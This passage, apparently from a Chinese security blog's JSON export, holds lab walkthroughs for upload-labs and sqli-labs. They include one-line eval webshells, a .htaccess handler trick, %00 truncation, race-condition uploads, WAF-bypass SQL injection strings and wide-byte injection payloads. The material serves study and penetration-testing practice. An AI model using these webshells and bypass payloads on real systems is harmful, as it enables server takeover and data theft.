，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。\n###0x02\n源码中post方式提交的路径是图片目录，这里直接提交10.php%00，可以看到上传的文件10.php。\n\n\n原因：这是由于文件名拼接目录名之后再进行php后缀的验证，而此时10.php文件后存在%00进行截断，就不会拼接后面的4.jpg文件，就认为是10.php文件，就完成了绕过。\n0x03访问文件：\nPass-13（POST%00截断）0x00这关提交方式是post，那这里%00就需要手动编码。\n\n0x01手动编码：\n\n0x02可以看到2.php文件已上传：\n\n0x03访问文件：\n\nPass-14（图片马绕过）0x00源码分析：\n\n\ngetimagesize() 函数：将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。函数成功返回的就是一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。\n根据源码和提示可知，这里应该是通过检查文件的头部信息去验证（读取判断上传文件的前两个字节）是否是jpg，png或gif格式的图片，页面也提示上传图片码。那这里的思路就是文件包含漏洞进行上传。\n补充知识：\n1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。2.Jpg图片文件包括2字节：FF D8。3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。4.Bmp图片文件包括2字节：42 4D。即为 BM。\n0x01将2.jpg图片以notepad++打开写入一句话上传：\n\n0x02然后需要在upload目录下新建include.php文件进行读取文件：内容填写：（如果不定义include.php文件不能访问上传的文件）\n&lt;?php\n$file = $_GET[ 'page' ] ;\ninclude ($file);\n?>\n\n之后访问一下地址：\nhttp:&#x2F;&#x2F;localhost&#x2F;upload&#x2F;include.php?page&#x3D;6620220215173309.jpg\n\n\nPass-15（突破getimagesize）0x00\nimage_type_to_extension()函数：（根据指定的图像类型返回对应的后缀名）会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求。\ngetimagesize()函数：取得图像大小。这个函数只接收图像格式信息，若是其他格式则函数返回为空，这样就直接限制了上传文件的类型。\n0x01上传图片马：\n0x02访问文件：\n\nPass-16（突破exif_imagetype）0x00源码分析：\n\nexif_imagetype() 函数：读取一个图像的第一个字节并检查其签名。   只接受图片信息，表示只能上传图片。\n了解函数功能后，这关基本和14，15关没什么区别。\n0x01第一张jpg图片，已上传：\n\n0x02访问文件：\nPass-17（二次渲染）0x00源码分析：\n三段关于jpg，png，gif的源码；\nimagecreatefromjpeg — 由文件或 URL 创建一个新图象。\n看到这个函数，其实这关就是使用二次渲染的过滤。\n0x01先尝试上传图片马，上传成功，14361.jpg。\n0x02尝试连接：\n可以看到访问上传的图片只是图片格式：\n\n而原来的图片内容中是有php代码的：\n\n使用notepad++打开上传的文件，果然，没有php代码：\n\n这里应该就是上述函数过滤后的结果，将上传的php代码进行了删除。\n0x03二次渲染绕过原理：\n绕过二次渲染，只需要找到渲染前后没有变化的位置，然后将php代码写进去上传文件，最后可以成功触发php代码。\n0x04可以看到这两部分内容不同：\n\n\n绕过方法：具体实现二次渲染绕过需要写脚本对两张图片进行对比，找到没有被修改的部分插入php代码即可。\nPass-18（条件竞争）0x00源码分析：\nunlink() 函数：删除文件。\n**move_uploaded_file(file,newloc)**：把上传的文件移动到新位置。\n它先将图片上传到服务器，之后，如果临时文件移动到$upload_file，并且文件后缀在jpg，png，gif之间的话，进行重命名，若不在的三者之间就删除文件。\n0x01由于源码当中没有进行二次渲染，所以这里可以上传图片马。\n但作者的本意并非如此，这里主要是考察的是条件竞争；也就是上传的php文件在被删除之前访问就会成功上传文件。通过后门连接，文件就不会被删除。\n0x02先上传一个php文件，抓包，将数据包发送至intruder下，点击clear清除所有标记：\n\n设置为如图：\n\n第一个参数修改为20，开始攻击：\n\n放包，使用其他浏览器一直访问3.php地址；\n疯狂访问，总有那么一瞬间就访问到了：（这里纯手工访问，电脑都快起飞了，最好是跑脚本，方便快捷）\n\nPass-19（条件竞争）0x00根据提示，这关需要代码审计，直接查看源码。\n\n源码中定义了很多可接受的后缀名：\n\n在index.php中调用了函数Myupload()：\n\n之后它会检查文件的拓展名，文件的大小，移动的目录，修改文件名等操作，由源码可以知道做了白名单过滤，这里也利用burp上传图片马，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。\n0x01burp设置模块和18关相同。\n0x02可以看到，在另外一个浏览器访问4.jpg文件，（这里以文件包含的地址访问，必须添加include.php），总会有一瞬间服务器来不及rename，以4.php文件上传，这时只要访问即可。\n\n\nPass-20（&#x2F;.绕过）0x00源码分析：\n\npathinfo() 函数：以数组的形式返回关于文件路径的信息。\n从源码可以看到文件名路径由post方式提交，应该可以使用00截断绕过；\n0x01抓包，修改文件名添加%00：\n0x02可以看到，3.php已上传：\n\n0x03访问文件，连接成功：\n0x04但这关本意并不是考察00截断，由于源码中含有move_uploaded_file()函数，它的特性是会忽略掉文件末尾的/.，所以这里利用这个思路进行绕过。\n0x05抓包修改数据：\n\n0x06可以看到upload-4.php文件已上传：\n\n0x07连接文件：\n\nPass-21（数组绕过）0x00源码分析：\n$is_upload &#x3D; false;\n$msg &#x3D; null;\nif(!empty($_FILES[&#39;upload_file&#39;]))&#123;\n    &#x2F;&#x2F;检查MIME\n    $allow_type &#x3D; array(&#39;image&#x2F;jpeg&#39;,&#39;image&#x2F;png&#39;,&#39;image&#x2F;gif&#39;);\n    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;\n        $msg &#x3D; &quot;禁止上传该类型文件!&quot;;\n    &#125;else&#123;\n        &#x2F;&#x2F;检查文件名\n        $file &#x3D; empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];\n        if (!is_array($file)) &#123;\n            $file &#x3D; explode(&#39;.&#39;, strtolower($file));\n        &#125;\n\n        $ext &#x3D; end($file);\n        $allow_suffix &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);\n        if (!in_array($ext, $allow_suffix)) &#123;\n            $msg &#x3D; &quot;禁止上传该后缀文件!&quot;;\n        &#125;else&#123;\n            $file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];\n            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];\n            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) &#123;\n                $msg &#x3D; &quot;文件上传成功！&quot;;\n                $is_upload &#x3D; true;\n            &#125; else &#123;\n                $msg &#x3D; &quot;文件上传失败！&quot;;\n            &#125;\n        &#125;\n    &#125;\n&#125;else&#123;\n    $msg &#x3D; &quot;请选择要上传的文件！&quot;;\n&#125;\n\nexplode()函数：把字符串打散为数组：\n\nstrtolower()函数：将所有字符串转换为小写。\nend() 函数：将内部指针指向数组中的最后一个元素，并输出。\nreset() 函数：把数组的内部指针指向第一个元素，并返回这个元素的值。\n这段代码大概意思就是：上传的文件先检查MIME，若是白名单类型则将整个文件的名字后缀通过explode()函数以.为标志分割为数组，之后end()函数检查最后一个数组是否为白名单类型，若是，则上传文件。\n具体效果如下：\n传空/字符串\n 则取上传文件名\n 如果上传conn19.php.jpg，会遇到explode分割为数组:\n $file[0]=conn19,$file[1]=php $file[2]=jpg\n $ext=jpg可以过白名单\n 但是reset($file)=conn19.$file[3-1]=jpg就是图片了\n 所以这里应该用到save_name，而且要传数组（传字符串就和空一样效果）\n\n\n 传数组\n save_name[3]=conn19.php\n save_name[5]=jpg\n $ext=jpg过白名单\n reset($file)=conn19.php $file[1]=null\n\n参考文章：\nhttps://www.cnblogs.com/SnowSec/p/14258452.html\n0x01由于源码先要检查MIME，这里就要先修改MIME：\n\n0x02这里需要修改保存文件的第三个数组为jpg进行绕过白名单验证：\n注意：save_name[2]需要手动添加。\n这是因为抓到的数据包中没有上传到服务器，当上传到服务器时，explode()函数只拆分upload-20为Array[0]，php为Array[1]，但此时我们呢手动添加Array[2]，而源码中end()函数正好取的是最后一个数组的元素，由于最后一个数组的元素被我们手动添加为jpg，则绕过了白名单验证。\n\n0x03可以看到文件已上传：\n\n0x04访问文件：\n\n0x05这关可以使用图片马进行进行上传：\n\n\n\nSummary文件上传方法：\n\n文件上传过程：\n\n由此可以看出，白名单要比黑名单安全很多。但是在实战中是没有代码的，绕过的话需要需要一个一个测试。最重要的还是明白上传的思路和方法，还有就是代码审计很重要，看得懂代码就已经成功一半了。\n","slug":"文件上传-upload-labs","date":"2022-02-14T06:12:41.000Z","categories_index":"文件上传","tags_index":"文件上传,靶场","author_index":"Aurora"},{"id":"ac44a9ac4337ea71f1fa38abe9d1c638","title":"文件上传-Webshell介绍","content":"[TOC]\nWebshell​        webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。\n​    在计算机科学中，Shell俗称壳（用来区别于“核”)，是指”为使用者提供操作界面”的软件（命令解释器)。类似于windows系统给的cmd.exe或者linux 下bash 等，虽然这些系统上的命令解释器不止一种。\nwebShell是一个网站的后门，也是一个命令解释器，不过是以web方式(HTTP协议）通信（传递命令消息)，继承了web用户的权限。webShell本质上是在服务器端可运行的脚本文件，后缀名为. php/.asp/.aspx/.jsp等，也就是说webShell接收来自于web 用户的命令，然后再服务器端执行。\n说白了，就是获得了网站操作权限。\nWebshell分类大马webShell 也可以是大马，也是网站木马。有一类webShell之所以叫大马，是因为与小马(一句话木马)区分开，并且代码比较大，但是功能比较丰富。同样，大马有很多种脚本格式，其功能基本相同。每个团队都有自己的定制大马。\n在大马中我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。这是asp 的大马。\n小马小马就是一句话木马，因为其代码量比较小，就是一句简单的代码。\n各个脚本的一句话：\nASP:\n&lt;%eval- request(“cmd”&quot;)%&gt;\n\nASP.NET:\n&lt;%@ Page Language&#x3D;&quot;“Jscript”%&gt;\n&lt;%eval(Request.Item [“cmd”],“unsafe”&quot; ) ;%&gt;\n\nPHP：\n&lt;?php @eval($_REQUEST [ &#39; cmd &#39; ] );?&gt;\n\n一句话木马短小精悍，功能强大，但是需要配合中国菜刀或者中国蚁剑客户端使用，中国菜刀是一句话木马的管理器，也是命令操作接口。\n原文链接：https://blog.csdn.net/Marsper/article/details/109455320\nWebshell原理  例如：\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\n\n基本原理：\n利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[&#39;cmd&#39;]表示从页面中获得cmd这个参数值。\n解析一句话木马：\n（1）php的代码要写在&lt;?php ?&gt;里面，服务器才能认出来这是php代码，然后才去解析。（2）@符号的意思是不报错，即使执行错误，也不报错。\n（3）cmd就是密码\n（4）eval()函数：eval()把字符串作为PHP代码执行。post方式接收到变量cmd，此时，变量cmd中的字符串被当作php代码来执行。\n可以参考一下这篇文章，讲得很细：\n原文链接：https://blog.csdn.net/weixin_39190897/article/details/86772765\n","slug":"文件上传-Webshell介绍","date":"2022-02-13T12:48:38.000Z","categories_index":"文件上传","tags_index":"文件上传,基础知识","author_index":"Aurora"},{"id":"d7d77bc82bafbf7e1e25394ce17aed92","title":"文件上传基础","content":"[TOC]\n前言相比于SQL注入等其他漏洞，文件上传漏洞风险更大，最直接的情况则是上传一个webshell拿权限。\n\n文件上传分类：\n\n了解到是文件上传漏洞时，要清楚是什么类型的文件上传漏洞，之后进行下一步操作。\n##文件上传漏洞原理：\n网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的\n实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell\n到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服\n务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。\n还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。\n漏洞危害1、获取网站权限，控制网站\n2、获取后台账号密码\n3、服务器提权\n4、获取内网权限等\n漏洞如何查找及1、黑盒测试：未知网站源码，未知网站情况，扫描敏感文件测试文件上传漏洞\n2、白盒测试：分析源代码查找文件上传功能等\n3、网站中上传头像或者会员中心的上传功能可测试是否有文件上传漏洞\n##前端验证（原理）\n文件上传若是采用前端验证，通过修改前端代码（JS代码）注释掉或删除掉（推荐）验证部分可实现上传，或者在浏览器中禁用JS（不建议）进行绕过。\n过程：\n1、将源代码复制到本地删除验证代码再上传\n原理：由于前端验证就是在本地运行，但需要在源代码中添加指向上传的地址：action，表示提交给谁（在浏览器中查看原来的请求地址插入到复制的代码中），这样就能是实现前端的绕过；\n2、浏览器禁用JS：可能会有其他JS代码控制上传功能，若是禁用JS可能会影响上传操作，因此不推荐使用。\n3、BP抓包（不怎么靠谱）：由于网页可能是由JS+PHP代码一起进行上传的功能，这种情况是可能会抓到包；但如果网页都是由JS代码实现提交功能则抓不到数据包，就上传不了服务器。因为BP是要上传到服务器使服务器进行解析文件，但是JS/HTML等的前端代码是在本地端运行的，根本抓不到数据包。\n（所谓前端验证就是本地验证）\n##文件上传常见验证\n 后缀名，类型，文件头等 \n1、后缀名：\n（1）黑名单（不允许上传的格式后缀）：asp，php，jsp，aspx，war\n​          黑名单缺陷：若限制后缀名不全，可以使用其他后缀名进行绕过，例如：php5，Phtml等\n（2）白名单（可允许上传的格式后缀）：jpg，png，zip，rar，gif，…\n2、文件类型：MIME 信息，通过类型猜测后缀名，可通过BP抓包伪造\n3、文件头：内容头信息\n文件上传漏洞绕过方法利用burp抓包改后缀名进行绕过；\n利用00截断上传webshell；\n构造图片马绕过；\n绕过服务器扩展名检测上传；\n竞争条件上传绕过。\n##.htaccess文件上传漏洞原理\n什么是.htaccess：\n.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，通过.htaccess文件可以实现网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n需要的代码如下：\n&lt;FilesMatch &quot;cimer&quot;&gt;\nSethandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch &gt;\n\n原理：\n若当前目录存在.htaccess后缀名的文件，目录中存在文件名中含有cimer，就把application/x-httpd-php当成MIME去执行，此MIME为php格式，此时这个文件就会被当作php文件执行。这时可用菜刀或蚁剑进行连接。\n实战意义：\n1、如果存在可以上传 .htaccess 文件，就可以直接利用此规则解析；\n2、如果存在修改文件权限，就直接修改解析规则；\n","slug":"文件上传基础","date":"2022-02-12T15:02:42.000Z","categories_index":"文件上传","tags_index":"文件上传,基础知识","author_index":"Aurora"},{"id":"e80d729249f46c80b287eec83a7a4367","title":"SQL注入-绕过WAF","content":"[TOC]\n前言由于网站会部署WAF，例如安全狗，宝塔等，各自有各自的WAF策略规则，因此，绕过的方法也不同。了解其最基本的WAF规则便可进行对其绕过。\n\nWAF绕过姿势1、大小写&#x2F;关键字的替换：\nid=1 UnIoN/**/SeLeCT 1,user()\nHex() bin() 等价于 ascii() \nSleep() 等价于 benchmark() \nMid()substring() 等价于 substr() \n@@user 等价于 User() \n@@Version 等价于 version()\n2、各种编码：\nurl，utf-8，utf-16，utf-32，hex等\n3、双写绕过：\nununionion，selselectect，oorr，aandnandd等\n4、HTTP参数污染（HPP）：\n?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3\n5、编码的加密与解密：hex，unlcode，base64等\n6、更改请求方式：\nGET，POST，COOKIE或数据包里的各种关键字等\n7、内联注释：\n/*!UnIon12345SelEcT*/ 1,user() \n8、FUZZ大法\n9、%20/*!44509union*/%23x%0aselect%201,2,3只基于Mysql数据库的版本号绕过\n逻辑层的绕过1、逻辑问题\n（1）云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。 \n（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输\n​          入,可尝试Bypass。 \n（3）HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致HTTPS     有 WAF 防护，HTTP 没有防护，直接访问 HTTP 站点绕过防护。 \n（4）特殊符号%00，部分 waf 遇到%00 截断，只能获取到前面的参数，无法获取到后面的有害参数 输 入 ， 从 而 导 致 Bypass 。 比 如 ： id=1%00and 1=2 union select 1,2,column_name from information_schema.columns\n2、性能问题\n猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只 要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。\n例：\n?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9\n\n PS：0xA*1000 指 0xA 后面”A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试 长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。\n猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向 量时超出了其缓冲区长度就会引发 bug，从而实现绕过。\n?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1 union select 1,schema_name,3 from\nINFORMATION_SCHEMA.schemata\n\n备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。\n3、白名单\n方式一：IP 白名单 从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情 况。 \n测试方法：修改 http 的 header 来 bypass waf \nX-forwarded-for \nX-remote-IP \nX-originating-IP \nX-remote-addr \nX-Real-ip\n方式二：静态资源 \n特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。\n http://x.x.x.x/sql.php/?id=1\n http://x.x.x.x/sql.php/1.js?id=1 \n备注：Aspx&#x2F;php 只识别到前面的.aspx&#x2F;.php 后面基本不识别\n方式三：url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。\n方式四：爬虫白名单\n部分WAF有提供爬虫白名单的功能，识别爬虫的技术一般有两种：1、根据UserAgent                      2、通过行为来判断\n其他对于安全狗来说，它在进行防护的时候会对关键字进行拦截，比如union select字段，它会把union select字段当成一个整体进行拦截，若对其从中间加干扰字符可进行对其绕过，对于database()字段，同样也是整体拦截，将database与()进行字符干扰等方法可将其绕过。\n其实最关键的是了解其拦截的方式，对其进行分析（抓包），针对其拦截的方式去写脚本进行注入（FUZZ大法）\n本地测试以网站安全狗为例：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,3 --+\n\n可以看到当进行联合注入的时候WAF对攻击进行了拦截\n\n\n而当只进行union或select单个字段进行查询时网站会报正常：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union&#x2F;select  1,2,3 --+\n\n\n说明安全狗只对union select两个字段在一起查询时才会拦截，这时只要将这两个字段进行干扰，使安全狗检测的时候认为它们不在一起便可进行成功注入。\n拦截order by\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;2&#39; order&#x2F;*&#x2F;*&#x2F;by 3%23\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;by 3%23\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;3&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;%23%0aby 3%23\n\n拦截union select\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23-----------A&#x2F;*&#x2F;select 1,2,3 %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--&#x2F;%23%23*&#x2F;select 1,2,3 %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--+&#x2F;%23%23*&#x2F;select 1,2,3 %23\n\n**拦截database()【也适用于拦截user()**】\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;--+A*&#x2F;() %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;*!&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;A*&#x2F;() %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,database&#x2F;*&#x2F;*!&lt;&gt;&lt;&gt;A*&#x2F;() %23\n\n拦截from（%0a：换行符）\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name)  &#x2F;*!%23%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name) &#x2F;*!%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23\n\n这里最重要的还是原理，使用Fuzz大法成功几率会大大增加，改天试试Fuzz大法\n附一篇博主的过狗文章：（主要学习思路和方法）原文链接：https://blog.csdn.net/weixin_43623271/article/details/122814962\n00截断原理这里说明一下00截断原理：\n0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。\n但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），\n遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。\n%00是被服务器解码为0x00发挥了截断作用。\n","slug":"SQL注入-绕过WAF","date":"2022-02-11T15:37:25.000Z","categories_index":"SQL注入","tags_index":"SQL注入,Bypass WAF","author_index":"Aurora"},{"id":"a92a2310a2f65e102da5b7c1e7626f1d","title":"SQL注入-堆叠注入","content":"[TOC]\n堆叠注入原理在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。\n如图：\n场景举例堆叠注入场景之一：\n在获取管理员的后台和密码后，由于密码加密无法破解，可以使用对的注入进行插入新的管理员账号密码管理后台获取数据。\n","slug":"SQL注入-堆叠注入","date":"2022-02-10T09:06:24.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"b7b3116373fd14d65fd221fa9b494766","title":"SQL注入-宽字节注入","content":"[TOC]\n宽字节注入原理原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ 。 \n注入思路思路一：由于单引号被过滤了，所以我们使用%df吃掉 \\， 具体的原因是urlencode(&#39;) &#x3D; %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。\n思路二：将 &#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。\n\n0x00这里以Less-32–Less-37为例。\n0x01Less-32\n源码中将&#39;，&quot;和\\进行了过滤&#96;。\n将 &#39; 转为\\&#39;， 将 \\ 转为\\\\，将 &quot;转为 \\&quot;，将\\&#39;转为\\\\\\&#39;。\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1\\&#39;\n\n可以看到\\&#39;过滤掉了。\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39;\n\n当使用%df将\\吃掉后成功注入。\n\n判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; order by 4 --+\n\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,3 --+\n\n\n0x02Less-33\n源码中使用了addslashes() 函数；\naddslashes()：返回在预定义字符之前添加反斜杠的字符串。\n预定义字符是： 单引号（&#39;） 双引号（&quot;） 反斜杠（\\）\n\nLess-33的payload与Less-32相同。\n0x03Less-34\n由于Less-34是POST方式提交信息，而上面几关是GET方式通过url形式提交，数据会通过URLencode；\nPOST注入中可以利用：将 utf-8 转换为 utf-16 或 utf-32，例如将&#39;转为 utf-16 为 �&#39;进行注入。\nuname&#x3D;�&#39; or 1&#x3D;1 #&amp;passwd&#x3D;\n\n\n判断字段数：\nuname&#x3D;�&#39; order by 3 #&amp;passwd&#x3D;\n\n\n判断回显点：\nuname&#x3D;�&#39; union select 1,2 #&amp;passwd&#x3D;\n\n\n原sql语句：\n@$sql=\"SELECT username, password FROM users WHERE username='$uname'\nand password='$passwd' LIMIT 0,1\n\n此时 sql 语句为:\nSELECT username, password FROM users WHERE username='�' or 1=1#' and password='$passwd' LIMIT 0,1\n\n\n\n0x04Less35\n源码中id值没有被处理，忽略addslashes()函数。\npayload：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 or 1&#x3D;1\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;1 order by 4\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3\n\n\n\n0x05Less-36\n源码中有了mysql_real_escape_string()函数过滤字符串。\n\nmysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n下列字符受影响： \\x00，  \\n，  \\r，  \\，  &#39;，&quot;， \\x1a\n判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;1%df&#39;  or 1&#x3D;1--+\n\n这里还是使用%df吃掉\\。\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-36&#x2F;?id&#x3D;�&#39;  or 1&#x3D;1--+\n\n或者这里直接使用�&#39;Bypass。\n\nNotice: \n在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。\n0x06Less-37\n源码当中还是使用了mysql_real_escape_string()函数，原理相同。\n\npayload：\nuname&#x3D;admin�&#39; or 1&#x3D;1#&amp;passwd&#x3D;\n\n\nSummary 从上面的几关当中，可以总结一下过滤 ‘ \\ 常用的三种方式是直接 replace， addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。\n","slug":"SQL注入-宽字节注入","date":"2022-02-10T07:14:55.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"ed28de52de42846cd0569a9a357ddaf1","title":"SQL注入-HPP","content":"[TOC]\n##服务器两层架构\n\n服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。\n大多数服务器对于参数解析的介绍：\n\n\n\nWeb服务器\n参数获取函数\n获取到的参数\n\n\n\nPHP&#x2F;Apache\n$_GET(“par”)\nLast\n\n\nJSP&#x2F;Tmocat\nRequest.getParameter(“par”)\nFirst\n\n\nPerl(CGI)&#x2F;Apache\nParam(“par”)\nFirst\n\n\nPython&#x2F;Apache\ngetvalue(“par”)\nAll(List)\n\n\nASP&#x2F;IIS\nRequest.QueryString(“par”)\nAll(comma-delimited string)\n\n\nHTTP参数处理在与服务器进行交互的过程中，客户端往往会在GET&#x2F;POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。\n例：对于index.jsp?id=1&amp;id=2请求\n对于上图服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。返回的数据也就是 apache 